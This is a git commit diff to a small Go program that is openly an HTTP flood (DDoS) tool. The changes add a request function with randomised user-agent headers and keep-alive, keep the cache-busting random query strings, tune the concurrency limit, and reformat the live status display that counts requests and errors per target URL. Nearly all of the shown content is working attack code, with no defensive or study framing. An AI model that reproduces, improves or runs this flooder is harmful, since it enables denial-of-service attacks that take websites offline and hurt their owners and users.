b93755c41a2b986cfec9e7d2370612308863c4c4
RaSta <neyromanser@gmail.com>
2022-02-26 23:08:28 +0200

    upd

--- README.md
+++ README.md
@@ -5,7 +5,7 @@
 ```
 go build
 ```
-or
+or  
 ```
 go run .
 ```
--- main.go
+++ main.go
@@ -5,10 +5,11 @@ import (
 	"github.com/gosuri/uilive"
 	"math/rand"
 	"net/http"
+	"strings"
 	"time"
 )
 
-var ConcurrencyLimit = 1000
+var ConcurrencyLimit = 200
 
 type target struct {
 	URl  		string
@@ -22,10 +23,35 @@ var running []*target
 
 var w *uilive.Writer
 
+func request(url string) error {
+	client := &http.Client{
+		Timeout: time.Second * 1,
+	}
+	req, err := http.NewRequest("GET", url, nil)
+	if err != nil {
+		return fmt.Errorf("Got error %s", err.Error())
+	}
+	req.Header.Add("Connection", "Keep-Alive")
+	req.Header.Add("Cache-Control", "max-age=0")
+	for _, h := range strings.Split(getuseragent(), "\r\n"){
+		kv := strings.Split(h, ":")
+		if len(kv) == 2 {
+			req.Header.Add(kv[0], kv[1])
+		}
+	}
+
+	response, err := client.Do(req)
+	if err != nil {
+		return fmt.Errorf("Got error %s", err.Error())
+	}
+	defer response.Body.Close()
+	return nil
+}
+
 func flood(t *target){
 
 	for t.Queue > ConcurrencyLimit {
-		time.Sleep(time.Millisecond * 100)
+		time.Sleep(time.Millisecond * 1000)
 	}
 
 	t.Requests++
@@ -33,7 +59,8 @@ func flood(t *target){
 	if t.Requests % 3 == 0 {
 		randUrl += "?" + string(rand.Int() * 1000)
 	}
-	_, err := http.Get(randUrl)
+	//_, err := http.Get(randUrl)
+	err := request(randUrl)
 	if err != nil {
 		t.Errors++
 	}
@@ -57,13 +84,13 @@ func main() {
 	}
 
 	for {
-		_, _ = fmt.Fprintf(w, "DDOS url\t\t\tRequests\tErrors\n")
+		_, _ = fmt.Fprintf(w, "%35s%15s%15s\n", "URL", "Requests", "Errors")
 		for i, _ := range targets {
 			t := *running[i]
-			fmt.Fprintf(w.Newline(), "%s\t\t\t%d\t%d\n", t.URl, t.Requests, t.Errors)
+			fmt.Fprintf(w.Newline(), "%35s%15d%15d\n", t.URl, t.Requests, t.Errors)
 		}
 
-		time.Sleep(time.Millisecond * 1000)
+		time.Sleep(time.Millisecond * 3000)
 	}
 
 }
